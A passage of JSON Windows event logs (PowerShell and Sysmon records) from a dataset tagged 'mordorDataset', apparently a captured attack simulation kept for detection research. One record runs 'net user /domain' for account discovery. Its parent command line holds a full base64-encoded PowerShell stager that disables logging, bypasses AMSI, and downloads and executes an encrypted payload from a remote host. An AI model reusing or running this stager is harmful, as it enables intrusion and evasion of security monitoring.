5.1.18362.752\r\n        Runspace ID = 9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n        Pipeline ID = 1\r\n        Command Name = New-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 16303\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"PipeName":"&lt;Anonymous Pipe&gt;","EventTypeOrignal":"INFO","EventID":18,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"host":"wec.internal.cloudapp.net","Channel":"Microsoft-Windows-Sysmon/Operational","UserID":"S-1-5-18","AccountType":"User","ThreadID":4048,"ProcessGuid":"{b34bc01c-2f95-5f69-5f01-000000000900}","EventReceivedTime":"2020-09-21 19:35:37","Opcode":"Info","EventTime":"2020-09-21 19:35:37","@timestamp":"2020-09-21T23:35:37.912Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3230297,"Task":18,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":1,"Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Category":"Pipe Connected (rule: PipeEvent)","UtcTime":"2020-09-21 23:35:37.143","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:35:37","EventID":1,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-38c9-5f69-8201-000000000900}","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","LogonGuid":"{b34bc01c-22a7-5f69-dfa7-100000000000}","Opcode":"Info","EventTime":"2020-09-21 19:35:37","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","CommandLine":"\"C:\\windows\\system32\\net.exe\" user /domain","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"Severity":"INFO","User":"THESHIRE\\pgustavo","Hashes":"SHA1=5B9EA3C45A11D4AEB1B1AC0F72C4C19308FC7D0B,MD5=A63DF9A6E9098CC189F2A3EFC37600F6,SHA256=96CDFD7B263947A6A7C0DB54141A6B8D7777DB0A03A17CBF95666D98422F937B,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07","SourceName":"Microsoft-Windows-Sysmon","CurrentDirectory":"C:\\windows\\system32\\","Description":"Net Command","Category":"Process Create (rule: ProcessCreate)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","IntegrityLevel":"High","UserID":"S-1-5-18","TerminalSessionId":"2","ThreadID":4048,"EventType":"INFO","ParentProcessGuid":"{b34bc01c-2f95-5f69-5f01-000000000900}","@timestamp":"2020-09-21T23:35:37.912Z","port":64545,"ParentCommandLine":"\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA","RecordNumber":3230298,"Task":1,"ParentProcessId":"7456","SourceModuleName":"eventlog","LogonId":"0x10a7df","Version":5,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\System32\\net.exe","OriginalFileName":"net.exe","UtcTime":"2020-09-21 23:35:37.144","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
